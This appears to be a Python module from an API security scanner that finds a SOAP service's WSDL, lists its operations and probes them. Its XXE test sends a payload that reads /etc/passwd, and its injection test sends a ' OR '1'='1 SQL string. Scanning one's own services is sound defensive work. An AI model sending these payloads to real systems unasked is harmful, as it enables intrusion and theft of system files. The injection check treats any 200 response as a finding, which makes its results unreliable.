"""SOAP API scanner."""

from typing import List, Dict, Any
import asyncio
from urllib.parse import urljoin
import xml.etree.ElementTree as ET
import re

from ...core.logger import Logger
from ...core.config import Config
from ...core.context import ScanContext, Endpoint
from ...utils.http_client import HTTPClient


class SOAPScanner:
    """Scanner for SOAP APIs."""

    def __init__(self, context: ScanContext = None, config: Config = None, logger: Logger = None):
        """
        Initialize SOAP scanner.

        Args:
            context: Scan context (optional for backward compatibility)
            config: Configuration
            logger: Logger instance
        """
        self.context = context
        self.config = config
        self.logger = logger or Logger(__name__)
        self.http_client = HTTPClient(
            logger=self.logger,
            timeout=config.timeout if config else 30,
            verify_ssl=config.verify_ssl if config else True,
            proxy=config.proxy.get_proxies() if (config and config.proxy) else None,
            custom_ca_path=config.custom_ca_path if config else None
        )

    async def discover_endpoints(self):
        return await asyncio.to_thread(self._discover_endpoints_sync)

    def _discover_endpoints_sync(self) -> List[Endpoint]:
        """
        Discover SOAP endpoints (standardized interface).

        Returns:
            List of discovered endpoints
        """
        endpoints = []

        try:
            # Find WSDL
            wsdl_url = self._find_wsdl()

            if not wsdl_url:
                self.logger.warning("WSDL not found")
                return endpoints

            # Parse WSDL
            methods = self._parse_wsdl(wsdl_url)

            # Convert methods to Endpoint objects
            for method in methods:
                endpoint = Endpoint(
                    path=method.get("path", ""),
                    method="POST",
                    metadata={
                        "type": "soap",
                        "soap_method": method.get("method", ""),
                        "wsdl_url": wsdl_url,
                        "full_url": method.get("full_url", "")
                    }
                )
                endpoints.append(endpoint)

                # Add to context if available
                if self.context:
                    self.context.add_endpoint(endpoint)

            self.logger.debug(f"Discovered {len(endpoints)} SOAP methods")

            return endpoints

        except Exception as e:
            self.logger.error(f"SOAP endpoint discovery failed: {str(e)}")
            return endpoints

    def discover_methods(self) -> List[Dict[str, Any]]:
        """
        Discover SOAP methods via WSDL (legacy method).

        Returns:
            List of discovered methods
        """
        methods = []

        try:
            # Find WSDL
            wsdl_url = self._find_wsdl()

            if not wsdl_url:
                self.logger.warning("WSDL not found")
                return methods

            # Parse WSDL
            methods = self._parse_wsdl(wsdl_url)
            self.logger.debug(f"Extracted {len(methods)} SOAP methods")

            return methods

        except Exception as e:
            self.logger.error(f"SOAP method discovery failed: {str(e)}")
            return methods

    def _find_wsdl(self) -> str:
        """
        Find WSDL location.

        Returns:
            WSDL URL or None
        """
        wsdl_paths = [
            "?wsdl",
            "/wsdl",
            "/service?wsdl",
            "/webservice?wsdl",
            "/soap?wsdl",
        ]

        for path in wsdl_paths:
            try:
                url = self.config.url + path if not self.config.url.endswith("/") else self.config.url + path
                resp = self.http_client.get(url)

                if resp.status_code == 200 and "wsdl" in resp.text.lower():
                    self.logger.debug(f"WSDL found at: {url}")
                    return url

            except Exception:
                pass

        return None

    def _parse_wsdl(self, wsdl_url: str) -> List[Dict[str, Any]]:
        """
        Parse WSDL and extract methods.

        Args:
            wsdl_url: WSDL URL

        Returns:
            List of SOAP methods
        """
        methods = []

        try:
            resp = self.http_client.get(wsdl_url)

            if resp.status_code != 200:
                return methods

            # Parse XML
            root = ET.fromstring(resp.content)

            # Extract namespaces
            namespaces = dict([node for _, node in ET.iterparse(
                ET.ElementTree(root).getroot(),
                events=['start-ns']
            )])

            # Find operations
            # This is a simplified parser
            text = resp.text

            # Extract method names from WSDL
            operation_pattern = r'<operation\s+name="([^"]+)"'
            matches = re.findall(operation_pattern, text)

            for match in matches:
                methods.append({
                    "path": f"/soap/operation/{match}",
                    "method": match,
                    "source": "soap",
                    "wsdl_url": wsdl_url,
                    "full_url": self.config.url
                })

        except Exception as e:
            self.logger.debug(f"WSDL parsing failed: {str(e)}")

        return methods

    def test_xxe(self, endpoint: str) -> bool:
        """
        Test for XXE vulnerability.

        Args:
            endpoint: SOAP endpoint

        Returns:
            True if vulnerable to XXE
        """
        xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <m:GetStockPrice xmlns:m="http://www.example.com/prices">
            <m:StockName>&xxe;</m:StockName>
        </m:GetStockPrice>
    </soap:Body>
</soap:Envelope>"""

        try:
            resp = self.http_client.post(
                endpoint,
                data=xxe_payload,
                headers={"Content-Type": "text/xml"}
            )

            # Check for XXE indicators
            if "passwd" in resp.text or "root:" in resp.text:
                return True

        except Exception:
            pass

        return False

    def test_soap_injection(self, endpoint: str) -> bool:
        """
        Test for SOAP injection.

        Args:
            endpoint: SOAP endpoint

        Returns:
            True if vulnerable
        """
        injection_payload = """<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <m:GetStockPrice xmlns:m="http://www.example.com/prices">
            <m:StockName>test' OR '1'='1</m:StockName>
        </m:GetStockPrice>
    </soap:Body>
</soap:Envelope>"""

        try:
            resp = self.http_client.post(
                endpoint,
                data=injection_payload,
                headers={"Content-Type": "text/xml"}
            )

            # Check for injection indicators
            if resp.status_code == 200 or "error" in resp.text.lower():
                return True

        except Exception:
            pass

        return False
